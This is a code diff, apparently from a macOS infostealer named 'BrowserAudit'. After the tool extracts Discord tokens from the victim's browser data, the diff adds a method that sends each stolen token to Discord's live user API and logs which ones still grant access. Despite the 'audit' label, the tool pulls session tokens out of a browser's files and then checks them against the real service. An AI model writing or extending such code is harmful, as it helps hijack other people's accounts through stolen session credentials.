@@ -306,8 +306,53 @@ class BrowserAudit:
 
         if found_any:
             print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted{self.COLORS['RESET']}\n")
+            self.validate_discord_tokens()
         else:
             print(f"{self.COLORS['YELLOW']}[!] No Discord tokens found (try: sudo ./dist/audit-macos){self.COLORS['RESET']}\n")
+
+    def validate_discord_tokens(self):
+        import urllib.request
+        import urllib.error
+
+        token_file = self.cookies_dir / "discord_tokens.txt"
+        if not token_file.exists():
+            return
+
+        print(f"{self.COLORS['CYAN']}[*] Validating Discord tokens...{self.COLORS['RESET']}")
+
+        valid_tokens = []
+        with open(token_file, 'r') as f:
+            lines = f.readlines()
+
+        for line in lines:
+            if '(plaintext)' not in line:
+                continue
+
+            try:
+                token = line.split('(plaintext) ')[1].strip()
+                headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
+                req = urllib.request.Request(
+                    'https://discord.com/api/v10/users/@me',
+                    headers=headers
+                )
+
+                try:
+                    response = urllib.request.urlopen(req, timeout=5)
+                    if response.status == 200:
+                        print(f"{self.COLORS['GREEN']}[✓] Token VALID: {token[:20]}...{self.COLORS['RESET']}")
+                        valid_tokens.append(token)
+                        self.log("INFO", f"Discord token validated: {token[:20]}...")
+                except urllib.error.HTTPError as e:
+                    if e.code == 401:
+                        print(f"{self.COLORS['RED']}[✗] Token INVALID/EXPIRED: {token[:20]}...{self.COLORS['RESET']}")
+                        self.log("WARNING", f"Discord token invalid: {token[:20]}...")
+                    else:
+                        print(f"{self.COLORS['YELLOW']}[?] Token check failed (HTTP {e.code}): {token[:20]}...{self.COLORS['RESET']}")
+            except:
+                pass
+
+        if not valid_tokens:
+            print(f"{self.COLORS['YELLOW']}[!] No valid Discord tokens found - they may be expired{self.COLORS['RESET']}\n")
 
     def filter_display_content(self, content, filename):
         if 'discord_tokens' in filename or 'discord_web' in filename:
